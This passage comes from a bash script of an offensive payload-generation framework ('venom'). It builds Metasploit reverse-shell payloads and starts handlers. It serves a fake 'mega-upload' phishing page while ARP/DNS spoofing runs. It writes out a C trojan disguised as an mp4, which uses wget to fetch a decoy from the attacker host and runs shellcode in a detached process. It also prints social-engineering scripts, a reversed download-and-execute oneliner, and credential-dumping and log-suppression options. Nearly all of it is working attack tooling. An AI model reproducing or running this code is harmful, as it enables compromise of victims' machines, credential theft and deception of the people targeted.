\"s|NaM3|htop_installer.deb|\" $IPATH/templates/phishing/mega.html > $ApAcHe/index.html\n        cp $IPATH/output/htop_installer.deb $ApAcHe/htop_installer.deb\n        echo \"- ATTACK VECTOR: http://mega-upload.com\"\n        echo \"- POST EXPLOIT : $P0\"\n        echo \"---\"\n        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)\n        echo \"[☠] Start a multi-handler...\"\n        echo \"[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell\"\n        echo \"[☯] Please dont test samples on virus total...\"\n          if [ \"$MsFlF\" = \"ON\" ]; then\n\n            if [ \"$paylo\" = \"linux/x86/meterpreter_reverse_https\" ] || [ \"$paylo\" = \"linux/x64/meterpreter_reverse_https\" ]; then\n              xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'\" & xterm -T \" DNS_SPOOF [redirecting traffic] \" -geometry 110x10 -e \"sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //\"\n            else\n              xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'\" & xterm -T \" DNS_SPOOF [redirecting traffic] \" -geometry 110x10 -e \"sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //\"\n            fi\n\n           cd $IPATH/output\n           # delete utf-8/non-ancii caracters from output\n           tr -cd '\\11\\12\\15\\40-\\176' < report.log > final.log\n           sed -i \"s/\\[0m//g\" final.log\n           sed -i \"s/\\[1m\\[34m//g\" final.log\n           sed -i \"s/\\[4m//g\" final.log\n           sed -i \"s/\\[K//g\" final.log\n           sed -i \"s/\\[1m\\[31m//g\" final.log\n           sed -i \"s/\\[1m\\[32m//g\" final.log\n           sed -i \"s/\\[1m\\[33m//g\" final.log\n           mv final.log $N4m-$lhost.log > /dev/null 2>&1\n           rm report.log > /dev/null 2>&1\n           cd $IPATH/\n          else\n\n            if [ \"$paylo\" = \"linux/x86/meterpreter_reverse_https\" ] || [ \"$paylo\" = \"linux/x64/meterpreter_reverse_https\" ]; then\n              xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'\" & xterm -T \" DNS_SPOOF [redirecting traffic] \" -geometry 110x10 -e \"sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //\"\n            else\n              xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'\" & xterm -T \" DNS_SPOOF [redirecting traffic] \" -geometry 110x10 -e \"sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //\"\n            fi\n          fi\n\n\n        else\n\n\n        echo \"- ATTACK VECTOR: http://$lhost\"\n        echo \"- POST EXPLOIT : $P0\"\n        echo \"---\"\n        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)\n        echo \"[☠] Start a multi-handler...\"\n        echo \"[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell\"\n        echo \"[☯] Please dont test samples on virus total...\"\n          if [ \"$MsFlF\" = \"ON\" ]; then\n\n            if [ \"$paylo\" = \"linux/x86/meterpreter_reverse_https\" ] || [ \"$paylo\" = \"linux/x64/meterpreter_reverse_https\" ]; then\n              xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'\"\n            else\n              xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'\"\n            fi\n\n            cd $IPATH/output\n            # delete utf-8/non-ancii caracters from output\n            tr -cd '\\11\\12\\15\\40-\\176' < report.log > final.log\n            sed -i \"s/\\[0m//g\" final.log\n            sed -i \"s/\\[1m\\[34m//g\" final.log\n            sed -i \"s/\\[4m//g\" final.log\n            sed -i \"s/\\[K//g\" final.log\n            sed -i \"s/\\[1m\\[31m//g\" final.log\n            sed -i \"s/\\[1m\\[32m//g\" final.log\n            sed -i \"s/\\[1m\\[33m//g\" final.log\n            mv final.log $N4m-$lhost.log > /dev/null 2>&1\n            rm report.log > /dev/null 2>&1\n            cd $IPATH/\n          else\n\n            if [ \"$paylo\" = \"linux/x86/meterpreter_reverse_https\" ] || [ \"$paylo\" = \"linux/x64/meterpreter_reverse_https\" ]; then\n              xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'\"\n            else\n              xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'\"\n            fi\n          fi\n        fi\n   fi\n\n\n\nsleep 2\n# CLEANING EVERYTHING UP\necho \"[☠] Cleanning temp generated files...\"\nsleep 2\nmv $IPATH/templates/phishing/mega[bak].html $InJEc12 > /dev/null 2>&1\nrm $ApAcHe/index.html > /dev/null 2>&1\nrm $ApAcHe/htop_installer.deb > /dev/null 2>&1\nclear\ncd $IPATH/\nsh_menu\n\nelse\n\n  echo ${RedF}[x]${white} Abort module execution ..${Reset};\n  sleep 2\n  sh_menu\n  clear\nfi\n}\n\n\n\n\n#\n# mp4-trojan horse \n#\nsh_mp4_trojan () {\n# get user input to build shellcode\necho \"[☠] Enter shellcode settings!\"\nlhost=$(zenity --title=\"☠ Enter LHOST ☠\" --text \"example: $IP\" --entry --width 300) > /dev/null 2>&1\nif [ \"$?\" -eq \"0\" ]; then\nlport=$(zenity --title=\"☠ Enter LPORT ☠\" --text \"example: 666\" --entry --width 300) > /dev/null 2>&1\npaylo=$(zenity --list --title \"☠ SHELLCODE GENERATOR ☠\" --text \"\\nAvailable Payloads:\" --radiolist --column \"Pick\" --column \"Option\" FALSE \"linux/ppc/shell_reverse_tcp\" FALSE \"linux/x86/shell_reverse_tcp\" TRUE \"linux/x86/meterpreter/reverse_tcp\" FALSE \"linux/x64/shell/reverse_tcp\" FALSE \"linux/x64/shell_reverse_tcp\" FALSE \"linux/x64/meterpreter/reverse_tcp\" --width 400 --height 300) > /dev/null 2>&1\nappl=$(zenity --title \"☠ Chose mp4 file to be backdoored ☠\" --filename=$IPATH/bin/mp4/ --file-selection) > /dev/null 2>&1\nmP4=$(zenity --entry --title \"☠ MP4 NAME ☠\" --text \"Enter MP4 output name\\nexample: ricky-video\" --width 300) > /dev/null 2>&1\n\n## setting default values in case user have skip this ..\nif [ -z \"$lhost\" ]; then lhost=\"$IP\";fi\nif [ -z \"$lport\" ]; then lport=\"443\";fi\nif [ -z \"$mP4\" ]; then mP4=\"ricky-video\";fi\nif [ -z \"$appl\" ]; then echo \"${RedF}[x]${white} This Module Requires one PDF file input\";sleep 3; sh_exit;fi\n\necho \"[☠] Building agent -> C format ..\" && sleep 2\n# display final settings to user\ncat << !\n\n    venom settings\n    ──────────────\n    LPORT   : $lport\n    LHOST   : $lhost\n    FORMAT  : C -> LINUX\n    PAYLOAD : $paylo\n    MP4VIDEO: $IPATH/output/streaming.mp4\n    TROJAN  : $IPATH/output/$mP4.mp4\n\n!\nsleep 1\n# Make sure that the extension provided its .mp4\next=$(echo $appl | cut -d '.' -f2)\nif [ \"$ext\" != \"mp4\" ]; then\n   echo ${RedF}[x]${white} Abort, NON compatible extension provided:${RedF}.$ext ${Reset};\n   sleep 3 && sh_exit\nfi\n\n# Parse mp4 video name for transformation\necho \"$appl\" > /tmp/test.txt\nN4m=$(grep -oE '[^/]+$' /tmp/test.txt) > /dev/null 2>&1\necho \"[☠] Rename mp4 from: $N4m To: streaming.mp4\" && sleep 2\ncp $appl $IPATH/output/streaming.mp4 > /dev/null 2>&1\n\n\n# use metasploit to build shellcode (msf encoded)\necho \"[☠] Using msfvenom to build raw C shellcode ..\" && sleep 2\nxterm -T \" SHELLCODE GENERATOR \" -geometry 110x23 -e \"msfvenom -p $paylo LHOST=$lhost LPORT=$lport -f c -o $IPATH/output/chars.raw\"\necho \"[☠] Parsing raw shellcode data (oneliner) ..\" && sleep 1\nparse=$(cat $IPATH/output/chars.raw | grep -v \"=\" | tr -d '\";' | tr -d '\\n' | tr -d ' ')\necho \"\"\necho \"unsigned char buf[] =\"\necho \"$parse\"\necho \"\"\n\n\ncd $IPATH/output\n# Build C program (trojan.mp4)\necho \"[☠] Building $mP4 C Program ..\" && sleep 2\necho \"#include<stdio.h>\" > $mP4.c\necho \"#include<stdlib.h>\" >> $mP4.c\necho \"#include<string.h>\" >> $mP4.c\necho \"#include<sys/types.h>\" >> $mP4.c\necho \"#include<sys/wait.h>\" >> $mP4.c\necho \"#include<unistd.h>\" >> $mP4.c\necho \"\" >> $mP4.c\necho \"/*\" >> $mP4.c\necho \"Author: r00t-3xp10it\" >> $mP4.c\necho \"Framework: venom v1.0.17\" >> $mP4.c\necho \"MITRE ATT&CK T1036 served as Linux RAT agent (trojan).\" >> $mP4.c\necho \"gcc -fno-stack-protector -z execstack $mP4.c -o $mP4.mp4\" >> $mP4.c\necho \"*/\" >> $mP4.c\necho \"\" >> $mP4.c\necho \"unsigned char voodoo[] = \\\"$parse\\\";\" >> $mP4.c\necho \"\" >> $mP4.c\necho \"int main()\" >> $mP4.c\necho \"{\" >> $mP4.c\necho \"   /*\" >> $mP4.c\necho \"   This fork(); function allow us to spawn a new child process (in background).\" >> $mP4.c\necho \"   Article: https://www.geeksforgeeks.org/zombie-and-orphan-processes-in-c\" >> $mP4.c\necho \"   */\" >> $mP4.c\necho \"   fflush(NULL);\" >> $mP4.c\necho \"   int pid = fork();\" >> $mP4.c\necho \"      if (pid > 0) {\" >> $mP4.c\necho \"         system(\\\"sudo /usr/bin/wget -qq http://$lhost/streaming.mp4 -O /tmp/streaming.mp4 && sudo /usr/bin/xdg-open /tmp/streaming.mp4 > /dev/nul 2>&1 & exit\\\");\" >> $mP4.c\necho \"      }\" >> $mP4.c\necho \"      else if (pid == 0) {\" >> $mP4.c\necho \"         /*\" >> $mP4.c\necho \"         We are running in child process (as backgrond job - orphan).\" >> $mP4.c\necho \"         setsid(); allow us to detach the child (shellcode) from parent (streaming.mp4) process,\" >> $mP4.c\necho \"         allowing us to continue running the shellcode in ram even if parent process its terminated.\" >> $mP4.c\necho \"         */\" >> $mP4.c\necho \"         setsid();\" >> $mP4.c\necho \"         void(*ret)() = (void(*)())voodoo;\" >> $mP4.c\necho \"         ret();\" >> $mP4.c\necho \"      } return 0;\" >> $mP4.c\necho \"}\" >> $mP4.c\n\n\n## Compile/permitions/copy_to_apache2 ( C program )\necho \"[☠] Compile C program (MITRE ATT&CK T1036) ..\" && sleep 1\ngcc -fno-stack-protector -z execstack $IPATH/output/$mP4.c -o $IPATH/output/$mP4.mp4\necho \"[☠] Give execution permitions to agent ..\" && sleep 1\nchmod +x $IPATH/output/$mP4.mp4 > /dev/null 2>&1\necho \"[☠] Porting all files to apache2 webroot ..\" && sleep 1\nzip $mP4.zip $mP4.mp4 > /dev/null 2>&1\ncp $IPATH/output/$mP4.mp4 $ApAcHe/$mP4.mp4 > /dev/null 2>&1\ncp $IPATH/output/$mP4.zip $ApAcHe/$mP4.zip > /dev/null 2>&1\ncp $IPATH/output/streaming.mp4 $ApAcHe/streaming.mp4 > /dev/null 2>&1\ncd $IPATH\n\n\n# CHOSE HOW TO DELIVER YOUR PAYLOAD\nserv=$(zenity --list --title \"☠ SHELLCODE GENERATOR ☠\" --text \"Payload stored:\\n$IPATH/output/$mP4.mp4\\n\\nchose how to deliver: $mP4.mp4\" --radiolist --column \"Pick\" --column \"Option\" FALSE \"multi-handler (default)\" TRUE \"Oneliner (download/exec)\" --width 305 --height 220) > /dev/null 2>&1\n\n\novni=$(cat $IPATH/settings|grep -m 1 'OBFUSCATION'|cut -d '=' -f2) # Read settings from venom-main settings file.\nif [ \"$serv\" = \"multi-handler (default)\" ]; then\n\n   original_string=\"sudo ./$mP4.mp4\";color=\"${RedF}\"\n   ## Read the next setting from venom-main setting file .\n   if [ \"$ovni\" = \"ON\" ]; then\n      ## Reverse original string (venom attack vector)\n      xterm -T \" Reversing Original String (oneliner)\" -geometry 110x23 -e \"rev <<< \\\"$original_string\\\" > /tmp/reverse.txt\"\n      reverse_original=$(cat /tmp/reverse.txt);rm /tmp/reverse.txt\n      original_string=\"rev <<< \\\"$reverse_original\\\"|\\$0\"\n      color=\"${GreenF}\"\n   fi\n\n   ## Print on terminal\n   echo ${white}[☠] venom-main/Settings: [OBFUSCATION:$color$ovni${white}]${Reset};sleep 1\n   echo \"---\";echo \"-  ${YellowF}SOCIAL_ENGINEERING:\"${Reset};\n   echo \"-  Persuade the target to run '$mP4.mp4' executable using their terminal.\"\n   echo \"-  That will remote download/exec (LAN) our mp4 video file and auto executes\"\n   echo \"-  our C shellcode in an orphan process (detach from mp4 video process).\"\n   echo \"-  REMARK: All files required by this module have been ported to apache2.\"\n   echo \"-\";echo \"-  ${YellowF}MANUAL_EXECUTION:\"${Reset};\n   echo \"-  $original_string\";echo \"---\"\n   echo -n \"[☠] Press any key to start a handler ..\"\n   read odf\n   echo \"[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell\"\n   echo \"[☯] Please dont test samples on virus total ..\"\n   ## Is venom framework configurated to store logfiles?\n   if [ \"$MsFlF\" = \"ON\" ]; then\n      xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'spool $IPATH/output/$mP4.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'\"\n   else\n      xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'\"\n   fi\n\nelse\n\n   original_string=\"sudo wget http://$lhost/$mP4.zip;unzip $mP4.zip;./$mP4.mp4\";color=\"${RedF}\"\n   ## Reverse original string (venom attack vector)\n   xterm -T \" Reversing Original String (oneliner)\" -geometry 110x23 -e \"rev <<< \\\"$original_string\\\" > /tmp/reverse.txt\"\n   reverse_original=$(cat /tmp/reverse.txt);rm /tmp/reverse.txt\n   ## Read the next setting from venom-main setting file .\n   if [ \"$ovni\" = \"ON\" ]; then\n      original_string=\"sudo wget http://$lhost/$mP4.zip;h=.;unzip $mP4.zip;\\$h/$mP4.mp4\"\n      color=\"${GreenF}\"\n   fi\n   \n   ## Print on terminal\n   echo ${white}[☠] venom-main/Settings: [OBFUSCATION:$color$ovni${white}]${Reset};sleep 1\n   echo \"---\";echo \"-  ${YellowF}SOCIAL_ENGINEERING:\"${Reset};\n   echo \"-  Persuade the target to run the 'oneliner' OR the 'oneliner_obfuscated' command\"\n   echo \"-  on their terminal. That will remote download/exec (LAN) our mp4 video file and\"\n   echo \"-  auto executes our C shellcode in an orphan process (detach from mp4 video process).\"\n   echo \"-\";echo \"-  ${YellowF}ONELINER:\"${Reset};\n   echo \"-  $original_string\";echo \"-\"\n   echo \"-  ${YellowF}ONELINER_OBFUSCATED:\"${Reset};\n   echo \"-  rev <<< \\\"$reverse_original\\\"|\\$0\"\n   echo \"---\"\n   echo -n \"[☠] Press any key to start a handler ..\"\n   read odf\n   echo \"[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell\"\n   echo \"[☯] Please dont test samples on virus total ..\"\n   ## Is venom framework configurated to store logfiles?\n   if [ \"$MsFlF\" = \"ON\" ]; then\n      xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'spool $IPATH/output/$mP4.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'\"\n   else\n      xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'\"\n   fi\n\nfi\n\n\n# CLEANING EVERYTHING UP\necho \"[☠] Cleanning temp generated files ..\"\nsleep 2\nrm /tmp/test.txt > /dev/null 2>&1\nrm /tmp/stream.mp4 > /dev/null 2>&1\nrm /tmp/reverse.txt > /dev/null 2>&1\nrm $ApAcHe/$mP4.mp4 > /dev/null 2>&1\nrm $ApAcHe/$mP4.zip > /dev/null 2>&1\nrm $ApAcHe/streaming.mp4 > /dev/null 2>&1\nrm $IPATH/output/$mP4.zip > /dev/null 2>&1\nrm $IPATH/output/streaming.mp4 > /dev/null 2>&1\nsleep 2 && sh_menu\n\n\nelse\n\n  echo ${RedF}[x]${white} Abort module execution ..${Reset};\n  sleep 2 && sh_menu\n  clear\nfi\n}\n\n\n\n\n\n# -----------------------------------------------------\n# build shellcode in EXE format (windows-platforms)\n# to deploy againts windows service (exe-service)\n# ------------------------------------------------------\nsh_shellcode22 () {\nQuE=$(zenity --question --title=\"☠ SHELLCODE GENERATOR ☠\" --text \"This module builds exe-service payloads to be\\ndeployed into windows_service_control_manager\\n(SCM) service-payload.\\n\\nRun module?\" --width 320) > /dev/null 2>&1\nif [ \"$?\" -eq \"0\" ]; then\n\n# get user input to build shellcode\necho \"[☠] Enter shellcode settings!\"\nlhost=$(zenity --title=\"☠ Enter LHOST ☠\" --text \"example: $IP\" --entry --width 300) > /dev/null 2>&1\nlport=$(zenity --title=\"☠ Enter LPORT ☠\" --text \"example: 666\" --entry --width 300) > /dev/null 2>&1\nN4m=$(zenity --entry --title \"☠ PAYLOAD NAME ☠\" --text \"Enter payload output name\\nexample: ProgramX\" --width 300) > /dev/null 2>&1\n# input payload choise\npaylo=$(zenity --list --title \"☠ SHELLCODE GENERATOR ☠\" --text \"\\nAvailable Payloads:\" --radiolist --column \"Pick\" --column \"Option\" TRUE \"windows/shell_bind_tcp\" FALSE \"windows/shell/reverse_tcp\" FALSE \"windows/meterpreter/reverse_tcp\" FALSE \"windows/meterpreter/reverse_tcp_dns\" FALSE \"windows/meterpreter/reverse_http\" FALSE \"windows/meterpreter/reverse_https\" FALSE \"windows/x64/meterpreter/reverse_tcp\" FALSE \"windows/x64/meterpreter/reverse_https\" --width 350 --height 350) > /dev/null 2>&1\n\n\n## setting default values in case user have skip this ..\nif [ -z \"$lhost\" ]; then lhost=\"$IP\";fi\nif [ -z \"$lport\" ]; then lport=\"443\";fi\nif [ -z \"$N4m\" ]; then N4m=\"ProgramX\";fi\n\necho \"[☠] Building shellcode -> exe-service format ...\"\nsleep 2\necho \"[☠] obfuscating -> msf encoders!\"\nsleep 2\n# display final settings to user\ncat << !\n\n    venom settings\n    ──────────────\n    LPORT   : $lport\n    LHOST   : $lhost\n    FORMAT  : EXE-SERVICE -> WINDOWS(SCM)\n    PAYLOAD : $paylo\n\n!\n\n# use metasploit to build shellcode (msf encoded)\nif [ \"$paylo\" = \"windows/x64/meterpreter/reverse_tcp\" ] || [ \"$paylo\" = \"windows/x64/meterpreter/reverse_https\" ]; then\nxterm -T \" SHELLCODE GENERATOR \" -geometry 110x23 -e \"msfvenom -p $paylo LHOST=$lhost LPORT=$lport --platform windows -f exe-service > $IPATH/output/$N4m.exe\"\nelse\nxterm -T \" SHELLCODE GENERATOR \" -geometry 110x23 -e \"msfvenom -p $paylo LHOST=$lhost LPORT=$lport -a x86 --platform windows -e x86/countdown -i 8 -f raw | msfvenom -a x86 --platform windows -e x86/call4_dword_xor -i 7 -f raw | msfvenom -a x86 --platform windows -e x86/shikata_ga_nai -i 9 -f exe-service > $IPATH/output/$N4m.exe\"\nfi\n\n\n# CHOSE HOW TO DELIVER YOUR PAYLOAD\nserv=$(zenity --list --title \"☠ SHELLCODE GENERATOR ☠\" --text \"Payload stored:\\n$IPATH/output/$N4m.exe\\n\\nchose how to deliver: $N4m.exe\" --radiolist --column \"Pick\" --column \"Option\" TRUE \"multi-handler (default)\" FALSE \"apache2 (malicious url)\" --width 305 --height 220) > /dev/null 2>&1\n\n\n   if [ \"$serv\" = \"multi-handler (default)\" ]; then\n      # START METASPLOIT LISTENNER (multi-handler with the rigth payload)\n      echo \"[☠] Start a multi-handler...\"\n      echo \"[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell\"\n      echo \"[☯] Please dont test samples on virus total...\"\n        if [ \"$MsFlF\" = \"ON\" ]; then\n          xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'\"\n          cd $IPATH/output\n          # delete utf-8/non-ancii caracters from output\n          tr -cd '\\11\\12\\15\\40-\\176' < report.log > final.log\n          sed -i \"s/\\[0m//g\" final.log\n          sed -i \"s/\\[1m\\[34m//g\" final.log\n          sed -i \"s/\\[4m//g\" final.log\n          sed -i \"s/\\[K//g\" final.log\n          sed -i \"s/\\[1m\\[31m//g\" final.log\n          sed -i \"s/\\[1m\\[32m//g\" final.log\n          sed -i \"s/\\[1m\\[33m//g\" final.log\n          mv final.log $N4m-$lhost.log > /dev/null 2>&1\n          rm report.log > /dev/null 2>&1\n          cd $IPATH/\n        else\n          xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'\"\n        fi\n      sleep 2\n\n\n   else\n\n\nP0=$(zenity --list --title \"☠ SHELLCODE GENERATOR ☠\" --text \"\\npost-exploitation module to run\" --radiolist --column \"Pick\" --column \"Option\" TRUE \"sysinfo.rc\" FALSE \"enum_system.rc\" FALSE \"dump_credentials.rc\" FALSE \"fast_migrate.rc\" FALSE \"stop_logfiles_creation.rc\" FALSE \"exploit_suggester.rc\" --width 305 --height 300) > /dev/null 2>&1\n\n\n  if [ \"$P0\" = \"stop_logfiles_creation.rc\" ]; then\n    #\n    # check if dependencies exist ..\n    #\n    if [ -e \"$pHanTom/post/windows/manage/Invoke-Phant0m.rb\" ]; then\n      echo \"[☠] Invoke-Phant0m.rb installed ..\"\n      sleep 2\n    else\n      echo \"[x] Invoke-Phant0m.rb not found ..\"\n      sleep 2\n      echo \"[☠] copy Invoke-Phant0m.rb to msfdb ..\"\n      sleep 2\n      cp $IPATH/aux/msf/Invoke-Phant0m.rb $pHanTom/post/windows/manage/Invoke-Phant0m.rb > /dev/null 2>&1\n      echo \"[☠] Reloading msfdb database ..\"\n      sleep 2\n      xterm -T \"RELOADING MSF DATABASE\" -geometry 110x23 -e \"msfdb reinit\" > /dev/null 2>&1\n      xterm -T \"RELOADING MSF DATABASE\" -geometry 110x23 -e \"msfconsole -q -x 'db_status; reload_all; exit -y'\" > /dev/null 2>&1\n    fi\n\n      #\n      # check if Invoke-Phantom.ps1 exists ..\n      #\n      if [ -e \"$IPATH/aux/Invoke-Phant0m.ps1\" ]; then\n        echo \"[☠] Invoke-Phant0m.ps1 found ..\"\n        sleep 2\n        cp $IPATH/aux/Invoke-Phant0m.ps1 /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1\n      else\n        echo \"[x] Invoke-Phant0m.ps1 not found ..\"\n        sleep 2\n        echo \"[☠] Please place module in $IPATH/aux folder ..\"\n        sleep 2\n        exit\n      fi\n  fi\n\n\n    # Build listenner resource file\n    echo \"use exploit/multi/handler\" > $lhost.rc\n    echo \"set LHOST $lhost\" >> $lhost.rc\n    echo \"set LPORT $lport\" >> $lhost.rc\n    echo \"set PAYLOAD $paylo\" >> $lhost.rc\n    echo \"exploit\" >> $lhost.rc\n    mv $lhost.rc $IPATH/output/$lhost.rc\n    cd $IPATH\n\n\n      # edit files nedded\n      cd $IPATH/templates/phishing\n      cp $InJEc12 mega[bak].html\n      sed \"s|NaM3|$N4m.exe|g\" mega.html > copy.html\n      cp copy.html $ApAcHe/index.html > /dev/null 2>&1\n      cd $IPATH/output\n      cp $N4m.exe $ApAcHe/$N4m.exe > /dev/null 2>&1\n      echo \"[☠] loading -> Apache2Server!\"\n      echo \"---\"\n      echo \"- SEND THE URL GENERATED TO TARGET HOST\"\n\n        if [ \"$D0M4IN\" = \"YES\" ]; then\n        # copy files nedded by mitm+dns_spoof module\n        sed \"s|NaM3|$N4m.exe|\" $IPATH/templates/phishing/mega.html > $ApAcHe/index.html\n        cp $IPATH/output/$N4m.exe $ApAcHe/$N4m.exe\n        echo \"- ATTACK VECTOR: http://mega-upload.com\"\n        echo \"- POST EXPLOIT : $P0\"\n        echo \"---\"\n        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)\n        echo \"[☠] Start a multi-handler...\"\n        echo \"[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell\"\n        echo \"[☯] Please dont test samples on virus total...\"\n          if [ \"$MsFlF\" = \"ON\" ]; then\n            xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'\" & xterm -T \" DNS_SPOOF [redirecting traffic] \" -geometry 110x10 -e \"sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //\"\n          cd $IPATH/output\n          # delete utf-8/non-ancii caracters from output\n          tr -cd '\\11\\12\\15\\40-\\176' < report.log > final.log\n          sed -i \"s/\\[0m//g\" final.log\n          sed -i \"s/\\[1m\\[34m//g\" final.log\n          sed -i \"s/\\[4m//g\" final.log\n          sed -i \"s/\\[K//g\" final.log\n          sed -i \"s/\\[1m\\[31m//g\" final.log\n          sed -i \"s/\\[1m\\[32m//g\" final.log\n          sed -i \"s/\\[1m\\[33m//g\" final.log\n          mv final.log $N4m-$lhost.log > /dev/null 2>&1\n          rm report.log > /dev/null 2>&1\n          cd $IPATH/\n          else\n            xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'\" & xterm -T \" DNS_SPOOF [redirecting traffic] \" -geometry 110x10 -e \"sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //\"\n          fi\n\n\n        else\n\n\n        echo \"- ATTACK VECTOR: http://$lhost\"\n        echo \"- POST EXPLOIT : $P0\"\n        echo \"---\"\n        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)\n        echo \"[☠] Start a multi-handler...\"\n        echo \"[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell\"\n        echo \"[☯] Please dont test samples on virus total...\"\n          if [ \"$MsFlF\" = \"ON\" ]; then\n            xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'\"\n            cd $IPATH/output\n            # delete utf-8/non-ancii caracters from output\n            tr -cd '\\11\\12\\15\\40-\\176' < report.log > final.log\n            sed -i \"s/\\[0m//g\" final.log\n            sed -i \"s/\\[1m\\[34m//g\" final.log\n            sed -i \"s/\\[4m//g\" final.log\n            sed -i \"s/\\[K//g\" final.log\n            sed -i \"s/\\[1m\\[31m//g\" final.log\n            sed -i \"s/\\[1m\\[32m//g\" final.log\n            sed -i \"s/\\[1m\\[33m//g\" final.log\n            mv final.log $N4m-$lhost.log > /dev/null 2>&1\n            rm report.log > /dev/null 2>&1\n            cd $IPATH/\n          else\n            xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'\"\n          fi\n        fi\n   fi\n\nsleep 2\n# CLEANING EVERYTHING UP\necho \"[☠] Cleanning temp generated files...\"\nmv $IPATH/templates/phishing/mega[bak].html $InJEc12 > /dev/null 2>&1\nrm $IPATH/templates/phishing/copy.html > /dev/null 2>&1\nrm $ApAcHe/$N4m.exe > /dev/null 2>&1\nrm $ApAcHe/index.html > /dev/null 2>&1\nrm /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1\nsleep 2\nclear\ncd $IPATH/\n\nelse\n\n\n  echo ${RedF}[x]${white} Abort module execution 